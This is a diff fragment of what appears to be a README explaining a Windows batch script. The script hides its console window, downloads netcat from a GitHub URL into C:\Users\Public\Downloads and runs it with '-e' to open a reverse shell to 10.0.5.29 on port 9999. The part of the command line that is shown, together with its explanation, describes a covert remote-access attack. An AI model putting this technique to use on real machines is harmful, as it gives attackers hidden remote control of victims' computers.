@@ -11,6 +11,9 @@ call windowMode -pid %errorlevel% -mode hidden & curl https://raw.githubusercont
 
 What the script does :
 `@echo off` is a standard directive in batch files (.bat) in Windows, and it serves a similar purpose to #!/bin/bash in Linux shell scripts. Its job is to not show the commands that are being ran.
+
 `getCmdPid.exe` is responsible for printing the PID number of the windows process we are using.
+
 `call windowMode -pid %errorlevel% -mode hidden` now we pass the pid number of the cmd prompt we are currently on to the windowmode.exe and hiding any potential errors.
+
 -the rest of the script downloads netcat (a remote control tool) and outputs it to a set folder, in this case C:\Users\Public\Downloads and then runs it with the parameter –e to connect to our listening machine 10.0.5.29 through the port 9999.
